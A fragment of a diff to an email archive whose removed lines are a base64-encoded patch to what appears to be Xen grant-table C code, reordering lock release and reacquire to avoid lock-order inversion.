-IHJlbW90ZSB0YWJsZSAoaWYgcmQgPT0gdGQpLCBzbyB3ZSBoYXZlIHRvIGRy
-b3AgdGhlIGxvY2sKLSAgICAgICAgICogaGVyZSBhbmQgcmVhY3F1aXJlLgor
-ICAgICAgICAgKiBhY3F1aXJlX2dyYW50X2Zvcl9jb3B5KCkgd2lsbCB0YWtl
-IHRoZSBsb2NrIG9uIHRoZSByZW1vdGUgdGFibGUsCisgICAgICAgICAqIHNv
-IHdlIGhhdmUgdG8gZHJvcCB0aGUgbG9jayBoZXJlIGFuZCByZWFjcXVpcmUu
-CiAgICAgICAgICAqLwogICAgICAgICBhY3RpdmVfZW50cnlfcmVsZWFzZShh
-Y3QpOwogICAgICAgICBncmFudF9yZWFkX3VubG9jayhyZ3QpOwpAQCAtMjY1
-NiwxMSArMjY1NSwyNSBAQCBhY3F1aXJlX2dyYW50X2Zvcl9jb3B5KAogICAg
-ICAgICAgICAgICAgICAgICAgICAgICBhY3QtPnRyYW5zX2dyZWYgIT0gdHJh
-bnNfZ3JlZiB8fAogICAgICAgICAgICAgICAgICAgICAgICAgICAhYWN0LT5p
-c19zdWJfcGFnZSkpICkKICAgICAgICAgeworICAgICAgICAgICAgLyoKKyAg
-ICAgICAgICAgICAqIExpa2UgYWJvdmUgZm9yIGFjcXVpcmVfZ3JhbnRfZm9y
-X2NvcHkoKSB3ZSBuZWVkIHRvIGRyb3AgYW5kIHRoZW4KKyAgICAgICAgICAg
-ICAqIHJlLWFjcXVpcmUgdGhlIGxvY2tzIGhlcmUgdG8gcHJldmVudCBsb2Nr
-IG9yZGVyIGludmVyc2lvbiBpc3N1ZXMuCisgICAgICAgICAgICAgKiBVbmxp
-a2UgZm9yIGFjcXVpcmVfZ3JhbnRfZm9yX2NvcHkoKSB3ZSBkb24ndCBuZWVk
-IHRvIHJlLWNoZWNrCisgICAgICAgICAgICAgKiBhbnl0aGluZywgYXMgcmVs
-ZWFzZV9ncmFudF9mb3JfY29weSgpIGRvZXNuJ3QgZGVwZW5kIG9uIHRoZSBn
-cmFudAorICAgICAgICAgICAgICogdGFibGUgZW50cnk6IEl0IG9ubHkgdXBk
-YXRlcyBpbnRlcm5hbCBzdGF0ZSBhbmQgdGhlIHN0YXR1cyBmbGFncy4KKyAg
-ICAgICAgICAgICAqLworICAgICAgICAgICAgYWN0aXZlX2VudHJ5X3JlbGVh
-c2UoYWN0KTsKKyAgICAgICAgICAgIGdyYW50X3JlYWRfdW5sb2NrKHJndCk7
-CisKICAgICAgICAgICAgIHJlbGVhc2VfZ3JhbnRfZm9yX2NvcHkodGQsIHRy
-YW5zX2dyZWYsIHJlYWRvbmx5KTsKLSAgICAgICAgICAgIGZpeHVwX3N0YXR1
-c19mb3JfY29weV9waW4ocmQsIGFjdCwgc3RhdHVzKTsKICAgICAgICAgICAg
-IHJjdV91bmxvY2tfZG9tYWluKHRkKTsKKworICAgICAgICAgICAgZ3JhbnRf
-cmVhZF9sb2NrKHJndCk7CisgICAgICAgICAgICBhY3QgPSBhY3RpdmVfZW50
-cnlfYWNxdWlyZShyZ3QsIGdyZWYpOworICAgICAgICAgICAgZml4dXBfc3Rh
-dHVzX2Zvcl9jb3B5X3BpbihyZCwgYWN0LCBzdGF0dXMpOwogICAgICAgICAg
-ICAgYWN0aXZlX2VudHJ5X3JlbGVhc2UoYWN0KTsKICAgICAgICAgICAgIGdy
-YW50X3JlYWRfdW5sb2NrKHJndCk7CisKICAgICAgICAgICAgIHB1dF9wYWdl
-KCpwYWdlKTsKICAgICAgICAgICAgICpwYWdlID0gTlVMTDsKICAgICAgICAg
-ICAgIHJldHVybiBFUkVTVEFSVDsK
-
---=separator--
+--0000000000007198c3057510193f--
